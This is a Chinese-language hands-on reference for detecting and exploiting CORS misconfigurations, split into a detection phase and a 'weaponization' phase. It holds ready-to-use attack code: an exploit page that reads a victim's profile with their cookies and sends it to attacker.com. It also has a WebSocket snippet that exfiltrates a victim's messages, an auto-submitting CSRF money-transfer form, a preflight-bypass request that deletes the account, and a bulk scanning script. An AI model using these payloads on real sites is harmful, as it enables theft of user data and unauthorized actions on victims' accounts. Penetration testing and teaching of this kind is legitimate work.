# CORS 跨域配置错误实战参考

> 阶段分离: [攻击] 检测CORS配置 → [利用] 窃取敏感数据/CSRF增强

---

# 攻击阶段 — 检测

## 1. 识别 CORS 配置

### 1.1 基础检测

```bash
# 正常跨域请求 (无CORS):
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → 无 Access-Control-Allow-Origin → 安全

# 错误配置:
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → Access-Control-Allow-Origin: https://evil.com ← ★ 危险!!!

# 万能通配:
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → Access-Control-Allow-Origin: * ← ★ 更危险!!!
```

### 1.2 检查 CORS 头组合

```bash
# === 看 Origin 是反射还是固定 ===
curl -H "Origin: https://evil.com" https://target.com/api/profile -I
# Access-Control-Allow-Origin: https://evil.com → 反射型, 危险

# === 看 credentials 支持 ===
curl -H "Origin: https://evil.com" https://target.com/api/profile -I
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true ← ★ 带凭据的跨域!!!

# === 危险组合 ===
# Allow-Origin: 反射Origin + Allow-Credentials: true
# → 可以带Cookie发起跨域请求!!!
```

### 1.3 绕过 Origin 白名单

```bash
# 如果白名单是 target.com:
Origin: https://target.com          → 通过
Origin: https://evil.target.com     → 通过? 子域名劫持!
Origin: https://target.com.evil.com → 通过? 后缀匹配!
Origin: https://target.com@evil.com → 通过? URL解析差异!

# 如果白名单是 *.target.com:
# → 任意子域名 (找XSS/子域接管)

# 如果白名单检查仅前缀:
Origin: https://target.com.evil.com → 通过 → 多级子域

# 大小写绕过:
Origin: https://Target.com → 通过

# null Origin:
Origin: null → 可能通过 (sandboxed iframe/文件)
```

---

# 利用阶段 — 武器化

## 2. CORS 窃取数据 PoC

```html
<!-- exploit.html (托管在 attacker.com) -->
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // 外带数据
  document.location='http://attacker.com/steal?data='+btoa(this.responseText);
};
req.open('GET', 'https://target.com/api/user/profile', true);
req.withCredentials = true;   // ★ 带Cookie
req.send();
</script>
```

## 3. 常用敏感接口

```
/api/user/profile        → 用户详情
/api/user/orders         → 订单
/api/admin/users         → 用户列表
/api/settings            → 配置
/api/keys                → API密钥
/api/tokens              → 认证令牌
/api/session             → 会话信息
```

## 4. 检测脚本

```javascript
// 浏览器F12 Console:
var domains = ['https://evil.com','https://null','null','https://target.com.evil.com'];
var testURL = 'https://target.com/api/user/profile';
domains.forEach(function(o) {
  fetch(testURL, {credentials: 'include'})
    .then(r => r.text())
    .then(d => {
      if (d.includes('sensitive_keyword')) {
        console.log('[+] CORS VULN with Origin: ' + o);
      }
    });
});
```

## 5. CORS 进阶绕过

### 5.1 子域名 XSS 链式利用

```bash
# 场景: CORS允许 *.target.com, 但某个子域存在XSS
# Step 1: 找到子域XSS
# chat.target.com/redirect?url=javascript:alert(1)

# Step 2: 利用子域XSS发起跨域请求
# 浏览器: 从 chat.target.com 发请求到 api.target.com → Origin合法!
# ★ 即使用户Cookie在api.target.com, 也能被chat子域XSS盗取
```

### 5.2 CORS + CSRF 组合攻击

```javascript
// 场景: CORS Allow-Origin: * 但只对简单请求
// 攻击: 用CSRF发送复杂请求 → CORS头不返回但请求已执行

// 表单自动提交 (无CORS时也能跨域写)
<form method="POST" action="https://target.com/api/transfer" id="csrf">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
// → 浏览器发POST, 自动带Cookie → 后端处理 → 虽然看不到响应但操作已完成
```

### 5.3 WebSocket + CORS

```javascript
// WebSocket 不受 CORS 限制!
// → 即使用户cookie的安全策略严格, WebSocket 连接可能直接发送

var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"action":"get_messages","user_id":"victim"}');
};
ws.onmessage = function(e) {
  // ★ 接收受害者消息 → 外带
  new Image().src = 'http://attacker.com/steal?d=' + btoa(e.data);
};
```

### 5.4 预检请求绕过 (Preflight Bypass)

```bash
# CORS预检 (OPTIONS): 限制Content-Type
# 简单请求: Content-Type = text/plain, application/x-www-form-urlencoded, multipart/form-data
# → 预检不触发 → CORS头不影响 → 请求直接发出!

# 攻击: 用简单Content-Type发敏感操作
fetch('https://target.com/api/delete-account', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'confirm=yes'
});
// ★ 预检不触发 → 即使CORS配置严格, 请求也能发出 (但看不到响应)
```

### 5.5 CORS 配置自动化检测

```bash
#!/bin/bash
# cors_check.sh — 批量CORS检测

TARGET="$1"
ENDPOINTS=(
  "/api/user/profile"
  "/api/user/settings"
  "/api/admin/users"
  "/api/keys"
)

ORIGINS=(
  "https://evil.com"
  "https://null"
  "null"
  "https://$TARGET.evil.com"
  "https://evil.$TARGET"
)

for ep in "${ENDPOINTS[@]}"; do
  for orig in "${ORIGINS[@]}"; do
    resp=$(curl -s -I -H "Origin: $orig" "https://$TARGET$ep")
    acao=$(echo "$resp" | grep -i "access-control-allow-origin")
    acac=$(echo "$resp" | grep -i "access-control-allow-credentials")
    if [ -n "$acao" ]; then
      echo "[!] $ep | Origin: $orig | $acao | $acac"
    fi
  done
done
```

---

*参考: OWASP CORS + PortSwigger CORS + CWE-942 + 实战案例*
